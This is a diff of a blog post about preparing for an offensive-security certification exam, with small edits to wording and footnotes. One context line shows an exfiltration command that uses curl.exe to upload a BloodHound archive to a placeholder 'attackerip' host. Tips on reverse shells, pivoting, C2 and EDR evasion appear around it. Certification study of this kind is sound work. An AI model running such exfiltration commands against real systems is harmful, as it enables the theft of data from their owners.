@@ -67,7 +67,7 @@ I prepped for 1.5 months, and this was my strategy:
 - [updog](https://github.com/sc0tfree/updog) is god. You can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
 - migrate your revshell processes for stability.
 - get comfortable with network pivoting.
-- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide. [^4]
+- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide[^4]. 
 - read the exam guide and the exam objectives. For instance, ai chatbots, paid tools and automated exploitation are not allowed.
 - IMHO, the challenges prepare you _enough_ to face the exam. Although I've heard HTB RastaLabs and Offshore are good prep too.
 - have a plan z: there are too many variables involved, so if something fails, you need to know different alternatives.
@@ -383,8 +383,8 @@ Was it worth the sweat? Absolutely. Most of the content actually transfers to re
 
 Already deep into [OSED](https://www.offsec.com/courses/exp-301/) prep. Will share that story here too whenever I make it through. Wish me luck! 🤞
 
-[^1]: well, generalizing here: there are others like CRTO, CRTE, CRTL, etc. There's no 1-to-1 comparison since each one focuses on a different angle: evasion, c2, etc.
-[^2]: Wasted hours because of this, kek.
+[^1]: well, generalizing here: there are others like CRTO, CRTE, CRTL, etc. There's no 1-to-1 comparison since each one focuses on a different angle: av/edr evasion, c2, etc.
+[^2]: wasted hours because of this, kek.
 [^3]: somehow slow AF.
 [^4]: I used msf because I was more familiar with it and it aligns with the course content. That said, other options like Sliver also have [success stories worth checking out](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver).
 [^5]: I had already purchased it when doing the PNPT cert a while ago.
